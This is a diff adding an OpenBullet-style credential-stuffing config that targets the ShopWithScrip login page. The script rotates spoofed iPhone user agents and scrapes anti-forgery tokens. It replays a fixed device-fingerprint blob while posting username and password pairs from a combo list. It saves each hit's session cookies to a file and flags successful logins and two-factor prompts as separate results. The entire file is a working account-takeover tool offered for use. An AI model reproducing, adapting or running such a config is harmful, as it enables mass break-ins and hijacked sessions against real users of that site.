@@ -1,0 +1,117 @@
+[SETTINGS]
+{
+  "Name": "ShopWithScrip",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2021-04-24T09:33:14.9495448-07:00",
+  "AdditionalInfo": "",
+  "Author": "MrBlackX",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+SET VAR "1" "Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
+SET VAR "2" "Mozilla/5.0 (iPad; CPU OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
+SET VAR "3" "Mozilla/5.0 (iPhone; CPU iPhone OS 12_1_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16D57"
+SET VAR "4" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1"
+SET VAR "5" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_0 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Version/10.0 Mobile/14A346 Safari/E7FBAF"
+SET VAR "L" "<1>|<2>|<3>|<4>|<5>"
+
+#Split UTILITY Variable "L" Split "|" -> VAR "UA" 
+
+#UA UTILITY List "UA" Random -> VAR "ua" 
+
+#Get REQUEST GET "https://shop.shopwithscrip.com/" 
+  
+  HEADER "User-Agent: <ua>" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
+  HEADER "Accept-Language: de,en-US;q=0.7,en;q=0.3" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Cache-Control: max-age=0" 
+
+#SignIn REQUEST GET "https://shop.shopwithscrip.com/Login" 
+  
+  HEADER "Host: shop.shopwithscrip.com" 
+  HEADER "User-Agent: <ua>" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
+  HEADER "Accept-Language: de,en-US;q=0.7,en;q=0.3" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Cookie: ASP.NET_SessionId=<COOKIES(ASP.NET_SessionId)>;" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Cache-Control: max-age=0" 
+
+#RequestToken PARSE "<SOURCE>" LR "<input name=\"__RequestVerificationToken\" type=\"hidden\" value=\"" "\" />" -> VAR "token" 
+
+#NcFormInfo PARSE "<SOURCE>" LR "<input type=\"hidden\" name=\"__ncforminfo\" value=\"" "\"/>" -> VAR "ncforminfo" 
+
+#Length FUNCTION Length "__RequestVerificationToken=<token>&PrimaryBb=0400IKTe%2Bl3LNUcHcCiyOFFxUPb7sHFhN4VQUzPtu%2BhsUXy52KYKxcAcnmZ7%2BEnMfC4LXpStwyj0QabgJFas07xHeDRe%2B7COJDVFrOMDmHHxdJu%2BPzA%2F5LoyAlu9en1pI%2B6SV%2FWUQMFiY%2BbsPCYe6PDn%2FwiAtkBfbf%2B0FjtWgmHOozm%2Bk3PpcqxXptC1UJgA1BQZQ4JudHOlf1KSnrbJSNyIsWB9R%2BWFa6fdu5iGRmShCofROnKMpqaNTz%2FoPRKys1lS3x2E4teMfHAkUN31dtGTUlWyiS6uDTtDFqHfv6lgZq%2FI%2F9TX4RjmZzBnxg3zCYy92TutBhVT32VCQZYniC%2BOTzUPcCWJ6jtVosTzKoxVC6estVp%2FXcSW9gl2olrNgUNP55Oej4xwFC61JU%2BtuABPCD0Wby7tTPrPsj69LfM7VRYrI1FeHSbDspvXHhwykQoibjftfIJWNJFpD8X064HfxUxwNpWm2i9tCXZjVj%2BJpy8kiBJpMqMw%2FSVBeKzAru%2BJYXyFHBbsmyyzb0vSwWRA%2BeSMeWgCk0M8gU5%2Bpf0qGt0GUg6fcTlgh1zqeMmBCH%2Fi9cmKrLQxcxA7Et2ah6cqo5IEFaG7TsuZF23lTgKl7Agxf4WV8yfU2UpsCnaElJYOfcQ%2BimBrj9k9P8bVPC8xwuAkVqzTvEd4NF77sI4kNUWs4wOYcfF0mwXrDBJwLpkm6yFodg%2Fw6rpzePqJKalESUVtlTUlIx7mBCnsoVWXTTQMgog1WtCs0kntMwDARHuVrI9wc9lbzgdMuKBZGX%2FD%2B07VOnzh7v%2B3nP%2BbNjYzpcNlqMj1aIzqbV%2BaN7%2BT%2BCgWVoQj5GJhENono3u6Pm0jKqogyHVJD1QjTIBnmyVMxokIagAfXhxiYE%2F0Gp7P1nG4Q3Xefa%2BYB7L7V5GatYOZLGtGMuSZx2KTkYmorIc4QBGiG%2BBAoPaUpyQxrxf6uhmzULSklvsB3FgA0veoNc3wMWvdnJNZfO7pv9eOvsyvTBXHS%2FCYIdI%2FlDj0nEo3ZjoPrN3hRtwMME24a9idvoX0a%2F6a%2B9aA%2BetajnfQJozwSCchb15ZaYUXrUhlG588pSC3X6t2xsBNqMBAVpCcyaDTc0NYqtbkyp9ezKyZCkphgNJNTTY3zrNbXJlRJpdAIhSGjrjX9asyCWHWQUn4Wb%2F1nk8fzVsxMfC5pfzfpeFAIbaE6BahRZtanQqdvJmhJ%2FiKVYv2uOnU23ZsJ7UU8NTb62OQPk0WbEAXpau2rD6eIlwX%2B6GQC7s0NEVCcuAzYjmBlGeBctfV5XpdijV3SdV4Tr%2BQO2O8H3bHVlWKRHjCK5NSM1NFYQP692r0N2CtzgallrdzeNWV2gQ%3D&SecondaryBb=&UserName=<USER>&Password=<PASS>&__ncforminfo=<ncforminfo>" -> VAR "L" 
+
+#Login REQUEST POST "https://shop.shopwithscrip.com/Login" 
+  CONTENT "__RequestVerificationToken=<token>&PrimaryBb=0400IKTe%2Bl3LNUcHcCiyOFFxUPb7sHFhN4VQUzPtu%2BhsUXy52KYKxcAcnmZ7%2BEnMfC4LXpStwyj0QabgJFas07xHeDRe%2B7COJDVFrOMDmHHxdJu%2BPzA%2F5LoyAlu9en1pI%2B6SV%2FWUQMFiY%2BbsPCYe6PDn%2FwiAtkBfbf%2B0FjtWgmHOozm%2Bk3PpcqxXptC1UJgA1BQZQ4JudHOlf1KSnrbJSNyIsWB9R%2BWFa6fdu5iGRmShCofROnKMpqaNTz%2FoPRKys1lS3x2E4teMfHAkUN31dtGTUlWyiS6uDTtDFqHfv6lgZq%2FI%2F9TX4RjmZzBnxg3zCYy92TutBhVT32VCQZYniC%2BOTzUPcCWJ6jtVosTzKoxVC6estVp%2FXcSW9gl2olrNgUNP55Oej4xwFC61JU%2BtuABPCD0Wby7tTPrPsj69LfM7VRYrI1FeHSbDspvXHhwykQoibjftfIJWNJFpD8X064HfxUxwNpWm2i9tCXZjVj%2BJpy8kiBJpMqMw%2FSVBeKzAru%2BJYXyFHBbsmyyzb0vSwWRA%2BeSMeWgCk0M8gU5%2Bpf0qGt0GUg6fcTlgh1zqeMmBCH%2Fi9cmKrLQxcxA7Et2ah6cqo5IEFaG7TsuZF23lTgKl7Agxf4WV8yfU2UpsCnaElJYOfcQ%2BimBrj9k9P8bVPC8xwuAkVqzTvEd4NF77sI4kNUWs4wOYcfF0mwXrDBJwLpkm6yFodg%2Fw6rpzePqJKalESUVtlTUlIx7mBCnsoVWXTTQMgog1WtCs0kntMwDARHuVrI9wc9lbzgdMuKBZGX%2FD%2B07VOnzh7v%2B3nP%2BbNjYzpcNlqMj1aIzqbV%2BaN7%2BT%2BCgWVoQj5GJhENono3u6Pm0jKqogyHVJD1QjTIBnmyVMxokIagAfXhxiYE%2F0Gp7P1nG4Q3Xefa%2BYB7L7V5GatYOZLGtGMuSZx2KTkYmorIc4QBGiG%2BBAoPaUpyQxrxf6uhmzULSklvsB3FgA0veoNc3wMWvdnJNZfO7pv9eOvsyvTBXHS%2FCYIdI%2FlDj0nEo3ZjoPrN3hRtwMME24a9idvoX0a%2F6a%2B9aA%2BetajnfQJozwSCchb15ZaYUXrUhlG588pSC3X6t2xsBNqMBAVpCcyaDTc0NYqtbkyp9ezKyZCkphgNJNTTY3zrNbXJlRJpdAIhSGjrjX9asyCWHWQUn4Wb%2F1nk8fzVsxMfC5pfzfpeFAIbaE6BahRZtanQqdvJmhJ%2FiKVYv2uOnU23ZsJ7UU8NTb62OQPk0WbEAXpau2rD6eIlwX%2B6GQC7s0NEVCcuAzYjmBlGeBctfV5XpdijV3SdV4Tr%2BQO2O8H3bHVlWKRHjCK5NSM1NFYQP692r0N2CtzgallrdzeNWV2gQ%3D&SecondaryBb=&UserName=<USER>&Password=<PASS>&__ncforminfo=<ncforminfo>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: shop.shopwithscrip.com" 
+  HEADER "User-Agent: <ua>" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
+  HEADER "Accept-Language: de,en-US;q=0.7,en;q=0.3" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Content-Length: <L>" 
+  HEADER "Origin: https://shop.shopwithscrip.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Referer: https://shop.shopwithscrip.com/Login" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+
+#Save_Cookies UTILITY File "Cookies\\[SHOPWITHSCRIP]-[<USER>]-COOKIES.txt" WriteLines "shop.shopwithscrip.com	true	/	true	0	__RequestVerificationToken	<COOKIES(__RequestVerificationToken)>\\nshop.shopwithscrip.com	true	/	false	0		sws_test_cookie\\nshop.shopwithscrip.com	true	/StartProgram	false	0		sws_test_cookie\\nshop.shopwithscrip.com	true	/TwoFactor	false	0		sws_test_cookie\\nshop.shopwithscrip.com	true	/StartProgram/OrgEnrollment	false	0		sws_test_cookie\\nshop.shopwithscrip.com	true	/	true	0	ASP.NET_SessionId	<COOKIES(ASP.NET_SessionId)>\\nshop.shopwithscrip.com	true	/	false	0	BNIS_x-bni-jas	<COOKIES(BNIS_x-bni-jas)>\\nshop.shopwithscrip.com	true	/Login	false	0		sws_test_cookie\\nshop.shopwithscrip.com	true	/	true	1619282376	ShopWithScrip.com-Production	<COOKIES(ShopWithScrip.com-Production)>\\n" 
+
+#Check KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Your username or password was entered incorrectly." 
+  KEYCHAIN Success OR 
+    KEY "Set Up Two-Step Authentication" 
+    KEY "Account Settings" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "Verify your account" 
+
